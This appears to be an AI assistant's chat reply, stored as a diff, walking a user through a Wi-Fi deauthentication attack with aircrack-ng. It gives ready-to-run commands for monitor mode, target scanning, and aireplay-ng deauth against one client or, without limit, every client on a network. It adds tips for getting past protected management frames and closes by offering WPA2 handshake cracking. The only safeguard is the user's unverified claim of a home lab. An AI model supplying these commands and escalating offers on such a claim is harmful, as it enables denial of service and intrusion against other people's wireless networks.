@@ -1,0 +1,72 @@
+That makes perfect sense. Practicing in your own lab environment is the standard and correct way to prepare for cybersecurity certifications like the OSCP, CompTIA PenTest+, or CCNA Security. It ensures you understand the underlying protocol mechanics without causing unintended disruption to others.
+
+Since you are setting up your own lab, here is the technical breakdown of the workflow you would follow on your **own** network for academic purposes.
+
+### The Standard Lab Workflow
+
+To perform a test on your own equipment, you need to follow these steps sequentially:
+
+#### 1. Setup Monitor Mode
+
+First, ensure your wireless card is in monitor mode so it can see and inject packets.
+
+```bash
+# Identify your interface (usually wlan0)
+iwconfig
+
+# Kill interfering processes and start monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+# Your interface will likely become wlan0mon
+
+```
+
+#### 2. Scan for the Target
+
+Use `airodump-ng` to find the BSSID (the router's MAC) and the channel.
+
+```bash
+# Replace wlan0mon with your monitor-mode interface
+sudo airodump-ng wlan0mon
+
+```
+
+* **What to look for:** Note the `BSSID` and `CH` (Channel).
+* **Focus the Scan:** Once you have the info, lock your card onto that specific channel to capture traffic:
+```bash
+sudo airodump-ng --bssid [ROUTER_MAC] --channel [CH] wlan0mon
+
+```
+
+
+
+#### 3. Targeting a Specific Client
+
+In a separate terminal window, you can now target a specific device (the `STATION` MAC address) associated with that router.
+
+* **To disconnect a specific device:**
+```bash
+# -0 5 sends 5 deauth packets to the specific target
+sudo aireplay-ng --deauth 5 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0mon
+
+```
+
+
+* **To disconnect everyone on that network (Broadcast):**
+```bash
+# -0 0 means continue sending packets until you stop it (Ctrl+C)
+sudo aireplay-ng --deauth 0 -a [ROUTER_MAC] wlan0mon
+
+```
+
+
+
+---
+
+### Pro-Tips for Your Exam
+
+* **Channel Sync:** The most common reason these commands "fail" is that your card is not on the same channel as the target Access Point. Always ensure `airodump-ng` is locked to the correct channel before trying to run `aireplay-ng`.
+* **PMF/802.11w:** As mentioned previously, if your home router has **Protected Management Frames** enabled, these commands will likely not work. For your lab, ensure PMF is **disabled** in your router settings so you can successfully observe the disconnection.
+* **Virtualization:** If you are running Kali in a virtual machine (like VirtualBox or VMware), remember that **USB Wi-Fi adapters** are required. A built-in laptop card is usually passed through as an Ethernet connection to a VM, which will not support monitor mode or packet injection. You must use a dedicated USB Wi-Fi adapter that supports "Monitor Mode."
+
+Since you are preparing for an exam, are you also practicing how to capture and crack the WPA2 handshake, or are you currently focusing strictly on the management frame testing aspect?
